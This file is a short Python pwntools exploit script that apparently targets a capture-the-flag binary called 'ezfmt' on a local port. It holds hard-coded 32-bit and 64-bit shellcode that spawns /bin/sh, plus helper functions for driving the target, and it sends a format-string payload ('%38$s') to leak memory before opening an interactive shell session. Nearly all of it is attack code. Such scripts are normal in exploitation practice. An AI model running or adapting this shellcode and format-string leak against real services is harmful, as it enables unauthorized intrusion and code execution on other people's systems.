#coding:utf-8
import sys
from pwn import*
from LibcSearcher import *
reload(sys)
sys.setdefaultencoding('utf8')
context(os = 'linux', arch = 'amd64', log_level = 'debug')
#context.terminal = ['tmux','splitw','-h']
filename = './ezfmt'
elf = ELF(filename)
#p = process(filename)
ip = "127.0.0.1"
port = 8001
p = remote(ip,port)
libc = elf.libc
shellcode32 = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
shellcode64 = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

s = lambda x: p.send(x)
sa = lambda x,y: p.sendafter(x,y)
sl = lambda x: p.sendline(x)
sla = lambda x,y: p.sendlineafter(x,y)
r = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
lg = lambda x: p.success('%s --> 0x%x' % (x, eval(x)))

def pause(opt = ''):
    raw_input()
    gdb.attach(p,opt)
    
p.recv()
sl('%38$s')


#pause()

p.interactive()
